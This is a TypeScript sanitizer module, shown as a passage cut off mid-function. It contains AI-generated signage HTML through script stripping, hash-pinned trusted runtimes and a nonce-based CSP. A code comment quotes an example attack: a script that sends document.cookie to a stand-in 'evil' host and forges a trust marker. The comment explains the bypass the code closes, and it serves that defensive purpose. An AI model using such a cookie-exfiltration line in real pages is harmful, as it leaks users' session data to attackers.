/**
 * designer-safe-srcdoc.ts — audit W0-02 (2026-07-13): containment for
 * AI-authored board HTML rendered via <iframe srcdoc sandbox="allow-scripts">.
 *
 * THE HOLE THIS CLOSES. The null-origin sandbox blocks cookies/parent-DOM,
 * but NOT script execution, postMessage, outbound requests, or CPU burn.
 * Model-authored (or prompt-injected) JavaScript inside a board could post
 * `educms-action` messages, read the render document, navigate the frame to
 * a hostile origin, or fetch out. Every srcdoc render therefore passes
 * through here first:
 *
 *   1. STRIP every <script> that is not one of OUR baked runtimes
 *      (identified by marker: EDUCMS-SHIM-V7 or V6 / VOS-FIT-ENGINE /
 *      VOS-STAGE-SCALE). New boards are already script-free at persist
 *      (the API strips model scripts before injecting the runtimes); this
 *      render-side pass contains LEGACY persisted boards too. In the same
 *      pass a byte-identical pinned EDUCMS-SHIM-V6 (a board kept before
 *      2026-09-23) is swapped for its V7, which hears its parent only.
 *   2. STRIP inline event-handler attributes (onload/onclick/…),
 *      javascript: URLs, <meta http-equiv=refresh>, <base>, and nested
 *      frames/objects/embeds.
 *   3. INJECT a strict CSP <meta> with a fresh per-render nonce:
 *      default-src 'none' (no fetch/XHR/WebSocket/form/frame), Google-Fonts
 *      styles/fonts, https images only, scripts ONLY with this render's
 *      nonce. Surviving trusted runtimes get the nonce stamped on; anything
 *      that slipped both strips still cannot execute.
 *   4. INJECT the VOS-STAGE-SCALE trusted runtime — the replacement for the
 *      model's (now stripped) self-scaling script: fits the fixed-size stage
 *      to the iframe viewport and shrinks any `data-fit-col` column that
 *      overflows its box. ES5 + Chromium-83-safe (Taurus players).
 *   5. INJECT the VOS-LIVE-MENU trusted runtime (2026-09-23) — paints a
 *      POS-bound board's rows from the live menu the parent resolves (see
 *      LIVE_MENU_RUNTIME below). Inert on every board it is never told about.
 *
 * The action channel is hardened separately (kiosk-frame-registry.ts +
 * the player's source-bound, key-resolved `educms-action` handler).
 */

import { readCspNonce } from './csp-nonce';

// ─────────────────────────────────────────────────────────────────────────
// INJ-004 (2026-08-02) — TRUST IS ANCHORED TO STRUCTURE, NOT TO A SUBSTRING.
//
// The old rule was `block.indexOf(marker) !== -1`. That meant a single
// COMMENT defeated both defences at once:
//
//     <script>fetch('https://evil/'+document.cookie) /* EDUCMS-SHIM-V6 */</script>
//
// …survived the strip AND got this render's CSP nonce stamped onto it, so the
// `script-src 'nonce-…'` rule then AUTHORISED it. One attacker-controlled
// comment turned the containment layer into a signing oracle.
//
// The rule now is:
//   1. the marker must be the body's LEADING comment, at index 0 — an
//      attacker cannot prepend code, and
//   2. the body must be one we have actually shipped: SHA-256 equality
//      against the registry below (or, for the one runtime whose body is
//      parameterised, an exact structural match).
//
// FAIL-CLOSED: a marker-anchored block that matches no known body is treated
// as untrusted and stripped. That is why the registry carries EVERY
// historical body, not just the current one — `DESIGNER_LAYOUT_ENGINE` was
// rewritten five times without bumping its marker, so boards persisted before
// 2026-06-30 still carry an older fit engine and must keep working.
// (`designer-safe-srcdoc.test.ts` recomputes the CURRENT bodies straight out
// of apps/api/src/ai/designer-edit-shim.ts and fails if they drift out of the
// registry — so the next engine change surfaces as a red test, never as a
// silently un-shimmed board in production.)
// ─────────────────────────────────────────────────────────────────────────

type TrustedRuntime = {
  marker: string;
  /** SHA-256 of every body ever shipped under this marker. */
  hashes?: string[];
  /** Exact structural match, for a runtime whose body is parameterised. */
  shape?: RegExp;
  /** Hash of a body this module owns — resolved lazily so it can never drift. */
  localBody?: () => string;
};

export const TRUSTED_RUNTIMES: TrustedRuntime[] = [
  {
    // apps/api/src/ai/designer-edit-shim.ts DESIGNER_EDIT_SHIM.
    // Byte-stable from 043f8082 until 2026-08-25, when it gained the
    // `educms-action` emit (a tap on a WIRED [data-action] hot zone) so an
    // AI-designed board can carry real tap targets like the kiosk pack does;
    // then 2026-09-12 (M0-3), when `applyTextAndStyles` learned the BOOLEAN
    // half of the text-style contract ({bold,italic,underline,strikethrough}),
    // which is what the builder's text bar actually writes.
    // EVERY body stays pinned — boards persisted earlier carry the older ones,
    // and an unpinned body is STRIPPED, which would leave an AI board with no
    // click-to-edit and no overrides at all.
    // Superseded 2026-09-23 by EDUCMS-SHIM-V7 (below), but every kept board
    // saved before then carries one of these — so they all stay pinned.
    marker: 'EDUCMS-SHIM-V6',
    hashes: [
      'cd11aff07ab7d8afb3c597fa27f5f4ce3fee0a62cf23874b0b1d1cb72194dc79', // 2026-09-12 M0-3 boolean text-style aliases (the last V6)
      '1ae3e413f28c9e8bfe4d106a84ff13e79eeceae8a6d7c6db97035a78db73a574', // 2026-08-25 runtime tap dispatch
      'cf2a1204382b12dc2978eee7ce0b62d0ffca6c49b6e133b130715acacc6c066b', // 043f8082
    ],
  },
  {
    // apps/api/src/ai/designer-edit-shim.ts DESIGNER_EDIT_SHIM since 2026-09-23:
    // V6 plus ONE statement opening its only `message` listener —
    // `if(e.source!==window.parent)return;` — so a sibling frame on the same
    // player page can no longer drive the board. Nothing else differs:
    // designer-safe-srcdoc.test.ts derives the last V6 back out of this body
    // and checks it against the pin above.
    // The two older entries are what buildSafeDesignerSrcdoc makes of the two
    // older V6 bodies at render (upgradeEditShimV6Body): pinned so the swapped
    // output is itself trusted if it is ever wrapped again. Tests recompute all
    // three from the exact V6 bytes (tests/fixtures/educms-shim-v6-bodies.json).
    marker: 'EDUCMS-SHIM-V7',
    hashes: [
      '9f4259b58e63de427fa137ad5982b9dfcc0d927fc790b9823eac698217914e38', // current (the last V6 + the parent-only guard)
      'daaf0ab3a506ee53c00037af39112b28c37fed4877df1c0d0d15731dd71e03f2', // the 2026-08-25 V6, upgraded at render
      '6db5ff2a96c8be5ff0a4d73420e640180695847fe1c3a51e424cfa917a568dec', // the 043f8082 V6, upgraded at render
    ],
  },
  {
    // apps/api/src/ai/designer-edit-shim.ts DESIGNER_LAYOUT_ENGINE.
    // Eight distinct bodies shipped under the SAME marker — every one of them is
    // baked into boards that are still persisted, so all are pinned.
    marker: 'VOS-FIT-ENGINE',
    hashes: [
      'f8b01244e1d17bd5151365ce7fd37967b28fdde46059c29843cc37e72d8c77cd', // current (2026-09-22 faint text ignored, photo slots never decoration, column-scoped shrink ≥85%)
      'a494d67f5a4782e3bf7065963342fd4ac28375ab5986a9ad4441f6f065190f95', // 2026-08-25 headline-wrap + container clamp
      'c45a887c7d9e5657896a69ab228b7efb552a45b834926bee9d0b0ddb4ee0204e', // 7d06e59b
      '71ab636ca6a942a1819440d9c74369b0adf070f872caf46fdd73d9b23c64b063', // 6459b0be
      '3b9244a003408266694ac0f207feb94814f69668ca33c656ee9240a01dbc59ba', // 8ca38f6c
      '0b46ddb65ab8f3ac16bd1bdee704644cf0d145819fc4a8c7abf6c92f803e0f2f', // 1a05768f
      '5e3f6415493d54c9e10c2d5485f33a258b6231b3f477d56787e6d8f4cc53835c', // 1d98ae0e
    ],
  },
  {
    // Owned by THIS file — hashed from the constant at call time, so it is
    // structurally impossible for it to drift out of the registry.
    marker: 'VOS-STAGE-SCALE',
    localBody: () => STAGE_SCALE_RUNTIME,
  },
  {
    // Owned by THIS file too (2026-09-23, POS-A) — the live-menu runtime every
    // AI board gets at render. Same lazy-hash rule as VOS-STAGE-SCALE.
    marker: 'VOS-LIVE-MENU',
    localBody: () => LIVE_MENU_RUNTIME,
  },
  {
    // The tiny per-board canvas-dims assignment injectDesignerLayoutEngine
    // bakes next to the fit engine (stripping it would under-apply the
    // legibility floor in scaled previews — the 2026-06-30 fix). Its body
    // carries the board's pixel dimensions, so it is validated by exact
    // shape rather than by hash. The regex is fully anchored and admits
    // nothing but two integer assignments.
    marker: 'VOS-CANVAS',
    shape: /^\/\*VOS-CANVAS\*\/window\.__VOS_CW=\d{1,6};(?:window\.__VOS_CH=\d{1,6};)?$/,
  },
];

// ─── SHA-256 (synchronous, ES5, Chromium-83 safe) ────────────────────────
// `crypto.subtle.digest` is async and this transform must stay a pure sync
// string function (it runs inside a useMemo on the render path). ~60 lines of
// vanilla SHA-256 instead. Correctness is pinned by a test that compares this
// against node's own crypto over a spread of inputs including multi-byte and
// astral-plane characters.
const SHA256_K = [
  0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
  0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
  0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
  0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
  0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
  0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
  0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
  0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
];

function utf8Bytes(str: string): number[] {
  const out: number[] = [];
  for (let i = 0; i < str.length; i++) {
    const c = str.charCodeAt(i);
    if (c < 0x80) {
      out.push(c);
    } else if (c < 0x800) {
      out.push(0xc0 | (c >> 6), 0x80 | (c & 63));
    } else if (c >= 0xd800 && c <= 0xdbff && i + 1 < str.length) {
      const c2 = str.charCodeAt(i + 1);
      if (c2 >= 0xdc00 && c2 <= 0xdfff) {
        const cp = 0x10000 + ((c - 0xd800) << 10) + (c2 - 0xdc00);
        out.push(0xf0 | (cp >> 18), 0x80 | ((cp >> 12) & 63), 0x80 | ((cp >> 6) & 63), 0x80 | (cp & 63));
        i++;
      } else {
        out.push(0xe0 | (c >> 12), 0x80 | ((c >> 6) & 63), 0x80 | (c & 63));
      }
    } else {
      out.push(0xe0 | (c >> 12), 0x80 | ((c >> 6) & 63), 0x80 | (c & 63));
    }
  }
  return out;
}

export function sha256Hex(input: string): string {
  const bytes = utf8Bytes(input);
  const bitLen = bytes.length * 8;
  bytes.push(0x80);
  while (bytes.length % 64 !== 56) bytes.push(0);
  const hi = Math.floor(bitLen / 4294967296);
  const lo = bitLen % 4294967296;
  bytes.push((hi >>> 24) & 255, (hi >>> 16) & 255, (hi >>> 8) & 255, hi & 255);
  bytes.push((lo >>> 24) & 255, (lo >>> 16) & 255, (lo >>> 8) & 255, lo & 255);

  const H = [0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19];
  const w = new Array<number>(64);
  const rotr = (x: number, n: number) => (x >>> n) | (x << (32 - n));

  for (let off = 0; off < bytes.length; off += 64) {
    for (let i = 0; i < 16; i++) {
      w[i] =
        ((bytes[off + i * 4] << 24) |
          (bytes[off + i * 4 + 1] << 16) |
          (bytes[off + i * 4 + 2] << 8) |
          bytes[off + i * 4 + 3]) >>> 0;
    }
    for (let i = 16; i < 64; i++) {
      const s0 = rotr(w[i - 15], 7) ^ rotr(w[i - 15], 18) ^ (w[i - 15] >>> 3);
      const s1 = rotr(w[i - 2], 17) ^ rotr(w[i - 2], 19) ^ (w[i - 2] >>> 10);
      w[i] = (w[i - 16] + s0 + w[i - 7] + s1) >>> 0;
    }
    let a = H[0], b = H[1], c = H[2], d = H[3], e = H[4], f = H[5], g = H[6], h = H[7];
    for (let i = 0; i < 64; i++) {
      const S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25);
      const ch = (e & f) ^ (~e & g);
      const t1 = (h + S1 + ch + SHA256_K[i] + w[i]) >>> 0;
      const S0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22);
      const maj = (a & b) ^ (a & c) ^ (b & c);
      const t2 = (S0 + maj) >>> 0;
      h = g; g = f; f = e;
      e = (d + t1) >>> 0;
      d = c; c = b; b = a;
      a = (t1 + t2) >>> 0;
    }
    H[0] = (H[0] + a) >>> 0; H[1] = (H[1] + b) >>> 0; H[2] = (H[2] + c) >>> 0; H[3] = (H[3] + d) >>> 0;
    H[4] = (H[4] + e) >>> 0; H[5] = (H[5] + f) >>> 0; H[6] = (H[6] + g) >>> 0; H[7] = (H[7] + h) >>> 0;
  }

  let hex = '';
  for (let i = 0; i < 8; i++) hex += ('00000000' + H[i].toString(16)).slice(-8);
  return hex;
}

/** Chromium-83-safe (no crypto.randomUUID there). CSP nonces just need to be unguessable-per-render. */
function makeNonce(): string {
  try {
    const c: Crypto | undefined = typeof crypto !== 'undefined' ? crypto : undefined;
    if (c?.getRandomValues) {
      const buf = new Uint8Array(16);
      c.getRandomValues(buf);
      let s = '';
      for (let i = 0; i < buf.length; i++) s += buf[i].toString(16).padStart(2, '0');
      return s;
    }
  } catch { /* fall through */ }
  return `${Math.random().toString(36).slice(2)}${Math.random().toString(36).slice(2)}`;
}

/**
 * VOS-STAGE-SCALE — trusted replacement for the model's self-scaling script.
 * ES5 only (ships to Chromium 83). Scales body.firstElementChild (the
 * fixed-size stage div every Designer board wraps itself in) to fit the
 * iframe viewport, centers it, and shrink-fits any [data-fit-col] column
 * that overflows its container. Re-runs on resize/fonts/late layout.
 */
const STAGE_SCALE_RUNTIME =
  '/*VOS-STAGE-SCALE*/(function(){try{' +
  'function fitCols(){try{var els=document.querySelectorAll("[data-fit-col]");' +
  'for(var i=0;i<els.length;i++){(function(el){' +
  'el.style.transform="";el.style.transformOrigin="top left";' +
  'var avail=el.clientHeight?el.clientHeight:(el.parentElement?el.parentElement.clientHeight:0);' +
  'var need=el.scrollHeight;' +
  'if(avail>0&&need>avail+2){var s=avail/need;if(s<0.5)s=0.5;el.style.transform="scale("+s+")";}' +
  '})(els[i]);}}catch(e){}}' +
  'function fit(){try{var b=document.body;if(!b)return;' +
  'b.style.margin="0";document.documentElement.style.overflow="hidden";b.style.overflow="hidden";' +
  'var st=b.firstElementChild;if(!st||!st.style)return;' +
  'var prev=st.style.transform;st.style.transform="";' +
  'var w=st.offsetWidth,h=st.offsetHeight;' +
  'var vw=window.innerWidth,vh=window.innerHeight;' +
  'if(!w||!h||!vw||!vh){st.style.transform=prev;return;}' +
  'if(Math.abs(vw-w)<2&&Math.abs(vh-h)<2){fitCols();return;}' +
  'var s=Math.min(vw/w,vh/h);' +
  'st.style.transformOrigin="top left";' +
  'st.style.transform="translate("+Math.max(0,Math.round((vw-w*s)/2))+"px,"+Math.max(0,Math.round((vh-h*s)/2))+"px) scale("+s+")";' +
  'fitCols();}catch(e){}}' +
  'if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",fit);}else{fit();}' +
  'window.addEventListener("resize",fit);' +
  'setTimeout(fit,300);setTimeout(fit,1200);' +
  'if(document.fonts&&document.fonts.ready&&document.fonts.ready.then){document.fonts.ready.then(function(){fit();});}' +
  '}catch(e){}})();';

/**
 * VOS-LIVE-MENU (2026-09-23, POS-A) — makes a POS-bound AI board actually live.
 *
 * A kept POS-bound AI board carries its rows' bindings (`posItemBindings`
 * `{ 'item.N': id }`, with `data-menu-row="N"` stamped on each row by the
 * server binder), but its baked runtime (EDUCMS-SHIM-V6/V7) cannot read a menu,
 * so it showed the prices it was generated with, forever. The parent
 * (ExternalHtmlWidget) now resolves the bindings against the screen's live menu
 * and posts the FULL desired state as `educms-overrides { pos }`; this runtime
 * paints it:
 *   • writes each bound field's text — the text node only, exactly the way the
 *     V6 shim writes an override (never innerHTML: a POS item name is data);
 *   • greys a sold-out / not-available row (attribute + a stylesheet rule, so
 *     clearing it is removing an attribute) and strikes a sold-out name; the
 *     row's price keeps full strength and says "Sold out" / "Not available";
 *   • restores the board's own words for anything it painted before and is no
 *     longer told to paint (an unbind, a menu that went away);
 *   • re-fits the text it changed: resets each changed field to the size it
 *     was fitted at for its original words, then fires `resize` — the one event
 *     EVERY VOS-FIT-ENGINE body ever baked listens for (and VOS-STAGE-SCALE) —
 *     so a longer name shrinks to its box and a sold-out → back round trip
 *     never ratchets the type down.
 * The operator's own override for a field (V6 applies it first, from the same
 * `educms-overrides { text }`) becomes that field's "own words" here, and a
 * field that is live is repainted at once, so a stale typed price never shows.
 *
 * Injected by buildSafeDesignerSrcdoc into EVERY AI board at render, so a board
 * kept before this runtime existed gets it too — nothing in the saved board
 * (and none of the pinned V6 / fit-engine hashes) changes. With no `pos`
 * message it does nothing at all. ES5 + Chromium-83-safe; no inset, no gap.
 *
 * PARENT ONLY (2026-09-23). The listener's first statement drops any message
 * whose `source` is not `window.parent`. Every frame on a player page can reach
 * this one as `parent.frames[i]` — a WEBPAGE zone runs a third-party page's JS
 * right next to the board — and a `pos` from any of them used to repaint the
 * prices. The one real sender, ExternalHtmlWidget, posts from the window that
 * contains this iframe, i.e. from `window.parent`, on every surface (player,
 * builder, previews). Same guard, character for character, as EDUCMS-SHIM-V7.
 */
const LIVE_MENU_RUNTIME = String.raw`/*VOS-LIVE-MENU*/(function(){try{
if(window.__vosLiveMenu)return;window.__vosLiveMenu=1;
var HAS=Object.prototype.hasOwnProperty,PAINTED=[],ROWS=[],FLAGS=[];
var CSS="[data-vos-lm] [data-field]:not([data-vos-lm-flag]),[data-vos-lm] [data-imgslot],[data-vos-lm] img,[data-vos-lm] picture,[data-vos-lm] video{opacity:.4!important;-webkit-filter:grayscale(1)!important;filter:grayscale(1)!important}[data-vos-lm=soldout] [data-field$='.name']{text-decoration:line-through!important}";
function all(s){try{return document.querySelectorAll(s);}catch(e){return [];}}
function index(){var idx={},n=all("[data-field]");for(var i=0;i<n.length;i++){var k=n[i].getAttribute("data-field");if(!k)continue;if(!HAS.call(idx,k))idx[k]=[];idx[k].push(n[i]);}return idx;}
function els(idx,k){return HAS.call(idx,k)?idx[k]:[];}
function trim(s){return String(s==null?"":s).replace(/^\s+|\s+$/g,"");}
var _ta=null;function dec(s){if(typeof s!=="string"||s.indexOf("&")===-1)return s;try{if(!_ta)_ta=document.createElement("textarea");_ta.innerHTML=s;return _ta.value;}catch(e){return s;}}
function textOf(el){if(el.children.length===0)return el.textContent;for(var i=0;i<el.childNodes.length;i++){if(el.childNodes[i].nodeType===3)return el.childNodes[i].nodeValue;}return "";}
function setText(el,t){if(el.children.length===0){el.textContent=t;return;}for(var i=0;i<el.childNodes.length;i++){if(el.childNodes[i].nodeType===3){el.childNodes[i].nodeValue=t;return;}}el.insertBefore(document.createTextNode(t),el.firstChild);}
function paint(el,t){if(el.__vosOrig===undefined){el.__vosOrig=textOf(el);el.__vosFs=el.style.fontSize||"";}el.__vosWant=t;if(trim(textOf(el))===trim(t))return false;if(el.__vosTouched)el.style.fontSize=el.__vosFs;el.__vosTouched=1;setText(el,t);return true;}
function restore(el){el.__vosWant=null;if(el.__vosOrig===undefined||trim(textOf(el))===trim(el.__vosOrig))return false;el.style.fontSize=el.__vosFs;setText(el,el.__vosOrig);return true;}
function rowOf(idx,r){var num=r.row==null?"":String(r.row).replace(/[^0-9]/g,"");if(num){var n=all("[data-menu-row='"+num+"']");if(n.length)return n[0];}var nm=els(idx,r.slot+".name");return nm.length?nm[0].parentElement:null;}
function css(){if(document.getElementById("vos-live-menu-css"))return;var s=document.createElement("style");s.id="vos-live-menu-css";s.appendChild(document.createTextNode(CSS));(document.head||document.documentElement).appendChild(s);}
function refit(){try{var ev;try{ev=new Event("resize");}catch(e){ev=document.createEvent("Event");ev.initEvent("resize",false,false);}window.dispatchEvent(ev);}catch(e){}}
function apply(p){var idx=index(),want=[],rowsOn=[],rows=p.rows||[],fields=p.fields||[],i,j,k,n;
for(i=0;i<rows.length;i++){var r=rows[i];if(!r||typeof r.slot!=="string")continue;var t=r.t||{};
for(k in t){if(!HAS.call(t,k)||typeof t[k]!=="string")continue;n=els(idx,r.slot+"."+k);for(j=0;j<n.length;j++)want.push([n[j],t[k]]);}
if(r.s==="soldout"||r.s==="missing"){var row=rowOf(idx,r);if(row)rowsOn.push([row,r.s,els(idx,r.slot+".price")]);}}
for(i=0;i<fields.length;i++){var f=fields[i];if(!f||typeof f.key!=="string"||typeof f.t!=="string")continue;n=els(idx,f.key);for(j=0;j<n.length;j++)want.push([n[j],f.t]);}
var changed=false,next=[],wanted=[];for(i=0;i<want.length;i++)wanted.push(want[i][0]);
for(i=0;i<PAINTED.length;i++){if(wanted.indexOf(PAINTED[i])===-1&&restore(PAINTED[i]))changed=true;}
for(i=0;i<want.length;i++){if(paint(want[i][0],want[i][1]))changed=true;if(next.indexOf(want[i][0])===-1)next.push(want[i][0]);}
PAINTED=next;var nextRows=[],nextFlags=[];if(rowsOn.length)css();
for(i=0;i<rowsOn.length;i++){var ro=rowsOn[i];if(ro[0].getAttribute("data-vos-lm")!==ro[1])ro[0].setAttribute("data-vos-lm",ro[1]);nextRows.push(ro[0]);for(j=0;j<ro[2].length;j++){ro[2][j].setAttribute("data-vos-lm-flag","1");nextFlags.push(ro[2][j]);}}
for(i=0;i<ROWS.length;i++){if(nextRows.indexOf(ROWS[i])===-1)ROWS[i].removeAttribute("data-vos-lm");}
for(i=0;i<FLAGS.length;i++){if(nextFlags.indexOf(FLAGS[i])===-1)FLAGS[i].removeAttribute("data-vos-lm-flag");}
ROWS=nextRows;FLAGS=nextFlags;if(changed)refit();}
addEventListener("message",function(e){try{if(e.source!==window.parent)return;var d=e.data;if(!d||typeof d!=="object"||d.type!=="educms-overrides")return;
if(d.text&&typeof d.text==="object"){var idx=index();for(var k in d.text){if(!HAS.call(d.text,k)||typeof d.text[k]!=="string")continue;var n=els(idx,k);for(var i=0;i<n.length;i++){var el=n[i];if(el.__vosOrig===undefined)continue;el.__vosOrig=dec(d.text[k]);if(el.__vosWant!=null&&trim(textOf(el))!==trim(el.__vosWant))setText(el,el.__vosWant);}}}
if(d.pos&&typeof d.pos==="object"&&d.pos.v===1)apply(d.pos);}catch(_){}});
}catch(e){}})();`;

// ─── EDUCMS-SHIM-V6 → V7 AT RENDER (2026-09-23) ─────────────────────────
// V7 (apps/api/src/ai/designer-edit-shim.ts) is V6 plus ONE statement opening
// its only `message` listener, so a sibling frame on the player page can no
// longer drive the board. Every board kept before V7 still carries a V6 body
// in its saved HTML, so the renderer upgrades it: a block whose body is
// BYTE-IDENTICAL to a pinned V6 (the trust check has already hashed it) is
// replaced by THAT body's V7 — the same bytes, the marker renamed, the guard
// inserted — and nonce-stamped like every trusted runtime. Each V6 ever baked
// maps to its own V7 (all pinned above), so a saved board changes in exactly
// one way: it stops hearing anyone but its parent. A V6-marked body that is
// NOT byte-identical is not touched by this: it fails the trust check and is
// stripped, exactly as before.

/** The statement V7 adds. VOS-LIVE-MENU opens its listener with it too. */
export const PARENT_ONLY_GUARD = 'if(e.source!==window.parent)return;';
const EDIT_SHIM_V6 = '/*EDUCMS-SHIM-V6*/';
const EDIT_SHIM_V7 = '/*EDUCMS-SHIM-V7*/';
const EDIT_SHIM_LISTENER = "addEventListener('message',function(e){try{";
const ANY_MESSAGE_LISTENER = /addEventListener\(\s*["']message["']/g;

/**
 * A V6 body → its V7: the marker renamed and PARENT_ONLY_GUARD made the first
 * statement of its `message` listener. Null for anything that is not a V6 body
 * with exactly ONE `message` listener of any form, in the V6 shape (a second
 * listener would stay unguarded). Every V6 ever baked qualifies — the tests run
 * all three. Pure; the caller decides WHICH bodies to upgrade.
 */
export function upgradeEditShimV6Body(body: string): string | null {
  if (body.indexOf(EDIT_SHIM_V6) !== 0) return null;
  const at = body.indexOf(EDIT_SHIM_LISTENER);
  if (at === -1 || (body.match(ANY_MESSAGE_LISTENER) || []).length !== 1) return null;
  const cut = at + EDIT_SHIM_LISTENER.length;
  return EDIT_SHIM_V7 + body.slice(EDIT_SHIM_V6.length, cut) + PARENT_ONLY_GUARD + body.slice(cut);
}

const SCRIPT_BLOCK = /^<script\b[^>]*>([\s\S]*)<\/script\s*>$/i;

/**
 * Which of OUR runtimes is this script body, byte for byte? Its marker — or
 * null when it is none of them.
 *
 * Anchored on structure, never on "contains a marker somewhere":
 *   • the body must OPEN with `/*MARKER*<!---->/` at index 0 (no leading
 *     whitespace, nothing before it), and
 *   • the whole body must hash to a runtime we shipped, or match that
 *     runtime's exact structural shape.
 */
function trustedMarkerOf(body: string): string | null {
  for (const rt of TRUSTED_RUNTIMES) {
    const prefix = '/*' + rt.marker + '*/';
    // Leading-comment anchor. `indexOf(prefix) === 0` (not `!== -1`) is the
    // whole point of this rewrite — do not loosen it.
    if (body.indexOf(prefix) !== 0) continue;
    if (rt.shape) return rt.shape.test(body) ? rt.marker : null;
    const digest = sha256Hex(body);
    if (rt.localBody && digest === sha256Hex(rt.localBody())) return rt.marker;
    if (rt.hashes && rt.hashes.indexOf(digest) !== -1) return rt.marker;
    // Marker matched but the body is not one we shipped → FAIL CLOSED.
    return null;
  }
  return null;
}

/**
 * Is this `<script …>…</script>` block one of OUR baked runtimes, byte for
 * byte? The block must be a well-formed script element whose body
 * trustedMarkerOf recognises.
 *
 * Anything else — including a block that merely mentions a marker in a
 * comment — is untrusted and gets stripped by the caller.
 */
export function isTrustedScriptBlock(block: string): boolean {
  const m = block.match(SCRIPT_BLOCK);
  return !!m && trustedMarkerOf(m[1]) !== null;
}

/** Strip inline on* handlers from every tag (looped — one pass can uncover another match). */
function stripEventHandlerAttrs(html: string): string {
  const re = /(<[a-zA-Z][^>]*?)\s+on[a-zA-Z]+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/g;
  let prev = '';
  let out = html;
  let guard = 0;
  while (out !== prev && guard < 10) {
    prev = out;
    out = out.replace(re, '$1');
    guard++;
  }
  return out;
}

/**
 * Sanitize a persisted/candidate Designer board document and wrap it with the
 * CSP + trusted runtime. Pure string transform — safe to useMemo per board.
 */
export function buildSafeDesignerSrcdoc(rawHtml: string): string {
  if (typeof rawHtml !== 'string' || !rawHtml) return rawHtml ?? '';
  // SEC-010 (2026-09-04) — USE THE PAGE'S NONCE WHEN THERE IS ONE.
  //
  // An `about:srcdoc` document inherits its embedder's CSP on top of its own,
  // so once the dashboard enforces `script-src 'self' 'nonce-<page>'`, a board
  // stamped with a FRESH nonce is refused by the PARENT policy no matter what
  // its own meta CSP says. Measured on 2026-09-04 in Chromium, WebKit and
  // Gecko: different nonce → blocked in all three; page nonce → runs in all
  // three. So the runtime below is stamped with the page nonce when the
  // document was served under one.
  //
  // The fallback is unchanged and is not a weakening: on the player and the
  // static board routes there is no page nonce, the parent has no enforcing
  // `script-src`, and a self-generated nonce is exactly what the srcdoc's own
  // `default-src 'none'` policy needs. What keeps a hostile board's script out
  // is that `isTrustedScriptBlock` DELETES every block that is not one of our
  // baked runtimes — the nonce only distinguishes ours, it was never the
  // barrier.
  const nonce = readCspNonce() || makeNonce();
  let html = rawHtml;

  // 1) Scripts: keep only our baked runtimes (nonce-stamped), drop the rest.
  //    A pinned EDUCMS-SHIM-V6 comes back as its V7, where it stood (see
  //    upgradeEditShimV6Body) — a board kept before V7 hears its parent only.
  html = html.replace(/<script\b[^>]*>[\s\S]*?<\/script\s*>/gi, (block) => {
    const m = block.match(SCRIPT_BLOCK);
    const marker = m ? trustedMarkerOf(m[1]) : null;
    if (!m || !marker) return '';
    if (marker === 'EDUCMS-SHIM-V6') {
      const v7 = upgradeEditShimV6Body(m[1]);
      if (v7 !== null) return `<script nonce="${nonce}">${v7}</script>`;
    }
    // Re-stamp the open tag with the render nonce (drop any prior attrs
    // except type; our runtimes carry none that matter).
    return block.replace(/<script\b[^>]*>/i, `<script nonce="${nonce}">`);
  });
  // Self-closing / dangling script tags (malformed docs) — no marker, drop.
  html = html.replace(/<script\b[^>]*\/>/gi, '');

  // 2) Passive-vector strips.
  html = stripEventHandlerAttrs(html);
  html = html.replace(/((?:href|src|action|formaction|xlink:href)\s*=\s*)(['"]?)\s*javascript:[^'">\s]*(\2)/gi, '$1$2#$3');
  html = html.replace(/<meta\b[^>]*http-equiv\s*=\s*["']?refresh[^>]*>/gi, '');
  html = html.replace(/<base\b[^>]*>/gi, '');
  html = html
    .replace(/<(iframe|object|embed)\b[\s\S]*?<\/\1\s*>/gi, '')
    .replace(/<(iframe|object|embed)\b[^>]*\/?>/gi, '');

  // 3) CSP meta (fresh each render; remove any stale one from a prior wrap).
  html = html.replace(/<meta\b[^>]*data-vos-csp[^>]*>/gi, '');
  const csp =
    `<meta data-vos-csp="1" http-equiv="Content-Security-Policy" content="` +
    `default-src 'none'; ` +
    `style-src 'unsafe-inline' https://fonts.googleapis.com; ` +
    `font-src https://fonts.gstatic.com data:; ` +
    `img-src https: data: blob:; ` +
    `script-src 'nonce-${nonce}'; ` +
    `form-action 'none'; base-uri 'none'; frame-src 'none'; object-src 'none'` +
    `">`;
  // VOS-LIVE-MENU goes AFTER the baked edit shim (which sits before </head>), so
  // for one message the shim writes an operator override first and the live
  // runtime can then put a bound field's live value straight back.
  const runtime =
    `<script nonce="${nonce}">${STAGE_SCALE_RUNTIME}</script>` +
    `<script nonce="${nonce}">${LIVE_MENU_RUNTIME}</script>`;

  // Insert CSP as early in <head> as possible (before any stylesheet/script),
  // and the runtime at end of head so it runs before <body> content scripts
  // would have (there are none left, but order stays deterministic).
  const headOpen = html.match(/<head\b[^>]*>/i);
  if (headOpen && headOpen.index !== undefined) {
    const at = headOpen.index + headOpen[0].length;
    html = html.slice(0, at) + csp + html.slice(at);
  } else {
    // No <head> — prepend a minimal one right after <html> (or at doc start).
    const htmlOpen = html.match(/<html\b[^>]*>/i);
    if (htmlOpen && htmlOpen.index !== undefined) {
      const at = htmlOpen.index + htmlOpen[0].length;
